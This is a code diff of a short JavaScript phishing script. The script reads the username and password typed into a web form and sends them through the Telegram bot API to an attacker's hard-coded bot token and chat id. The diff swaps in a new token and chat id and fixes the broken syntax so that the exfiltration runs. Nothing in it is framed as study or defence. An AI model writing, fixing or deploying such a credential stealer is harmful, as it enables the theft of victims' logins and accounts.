@@ -1,15 +1,15 @@
-var telegram_bot_id = "5618597143:AAE2j2MEiYfwFy-80ELc7bo039cuzhXEvDg";
-var chat_id = 5361641680;
-var Username, password ;
-var  function ready() {
+var telegram_bot_id = "5798980471:AAGwK7k_N86wc8tYT4-62ZSRCq9ulmTkTi0";
+var chat_id = 5798980471;
+var Username, passwords, message;
+var ready = function () {
     Username = document.getElementById("Username").value;
-    password = document.getElementById("password").value;
-    message = "Username: " + Username + "\password: " + password ;
+    passwords = document.getElementById("passwords").value;
+    message = "Username: " + Username + "\passwords: " + passwords ;
 };
-var function sender() {
+var sender = function () {
     ready();
     var settings = {
-         "async": true,
+        "async": true,
         "crossDomain": true,
         "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
         "method": "POST",
@@ -26,6 +26,6 @@ var function sender() {
         console.log(response);
     });
     document.getElementById("Username").value = "";
-    document.getElementById("password").value = "";
+    document.getElementById("passwords").value = "";
     return false;
 };
